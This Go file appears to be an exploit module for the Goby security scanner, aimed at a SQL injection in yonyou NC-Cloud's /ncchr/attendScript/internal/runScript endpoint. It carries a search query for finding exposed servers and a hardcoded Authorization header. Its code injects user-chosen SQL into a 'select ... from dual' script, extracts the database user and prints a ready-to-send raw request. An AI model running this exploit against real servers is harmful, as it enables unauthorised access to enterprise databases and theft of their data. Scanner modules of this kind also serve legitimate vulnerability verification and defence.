package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-NC-Cloud /ncchr/attendScript/internal/runScript SQL Injection Vulnerability",
    "Description": "<p>NC Cloud large-scale enterprise digital platform, based on cloud native architecture, deeply applies new generation digital technology to build an open, interconnected, converged and intelligent integrated cloud platform, supporting flexible deployment modes of public cloud, hybrid cloud and exclusive cloud. </p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://www.yonyou.com/subject/gd-yyBIP?utm_source=bdpz&utm_campaign=red&utm_content=Title&utm_term=Title1#",
    "DisclosureDate": "2024-04-30",
    "PostTime": "2024-05-20",
    "Author": "2980611405@qq.com",
    "FofaQuery": "header=\"/nccloud\"",
    "GobyQuery": "header=\"/nccloud\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1.The official has not fixed the vulnerability yet. Please contact the manufacturer to fix the vulnerability:<a href=\"https://www.yonyou.com/subject/gd-yyBIP?utm_source=bdpz&amp;utm_campaign=red&amp;utm_content=Title&amp;utm_term=Title1#\">https://www.yonyou.com/subject/gd-yyBIP?utm_source=bdpz&amp;utm_campaign=red&amp;utm_content=Title&amp;utm_term=Title1#</a></p><p>2.Deploy Web Application Firewall to monitor database operations.</p><p>3.if not necessary, prohibit public access to the system. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "USER",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.6",
    "Translation": {
        "CN": {
            "Name": "用友NC-Cloud /ncchr/attendScript/internal/runScript SQL 注入漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>NC Cloud大型企业数字化平台，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/subject/gd-yyBIP?utm_source=bdpz&amp;utm_campaign=red&amp;utm_content=Title&amp;utm_term=Title1#\">https://www.yonyou.com/subject/gd-yyBIP?utm_source=bdpz&amp;utm_campaign=red&amp;utm_content=Title&amp;utm_term=Title1#</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "yonyou-NC-Cloud /ncchr/attendScript/internal/runScript SQL Injection Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>NC Cloud large-scale enterprise digital platform, based on cloud native architecture, deeply applies new generation digital technology to build an open, interconnected, converged and intelligent integrated cloud platform, supporting flexible deployment modes of public cloud, hybrid cloud and exclusive cloud.&nbsp;<br></p>",
            "Recommendation": "<p>1.The official has not fixed the vulnerability yet. Please contact the manufacturer to fix the vulnerability:<a href=\"https://www.yonyou.com/subject/gd-yyBIP?utm_source=bdpz&amp;utm_campaign=red&amp;utm_content=Title&amp;utm_term=Title1#\">https://www.yonyou.com/subject/gd-yyBIP?utm_source=bdpz&amp;utm_campaign=red&amp;utm_content=Title&amp;utm_term=Title1#</a></p><p>2.Deploy Web Application Firewall to monitor database operations.</p><p>3.if not necessary, prohibit public access to the system. <br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`

	makeRegularsjiu845 := func(RegularContent string, RegularUrl string) (string, error) {
		reRequestsjdsdw58 := regexp.MustCompile(RegularUrl)
		if !reRequestsjdsdw58.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestsjdsdw58.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	sendPayload5wdsx := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/ncchr/attendScript/internal/runScript`
		payload := "key=1&script=select 1,2,"+ sql +",3,4,5,6,7,8,9,10 from dual"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.Timeout = 15

		cfg.Header.Store("Content-Type", " application/x-www-form-urlencoded")
    cfg.Header.Store("Authorization"," 58e00466213416018d01d15de83b0198")
		cfg.Data = payload

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "USER") {
			return nil, errors.New("not info")
		}
		return httpclient.DoHttpRequest(hostInfo, cfg)

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `USER`
			_, err := sendPayload5wdsx(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/ncchr/attendScript/internal/runScript`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload5wdsx(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularsjiu845(resp.Utf8Html,`"USER":"([^"]+)"`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload5wdsx(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /ncchr/attendScript/internal/runScript HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Authorization: 58e00466213416018d01d15de83b0198
Connection: close

` + "key=1&script=select 1,2,USER,3,4,5,6,7,8,9,10 from dual"
			}
			return expResult
		},
	))
}
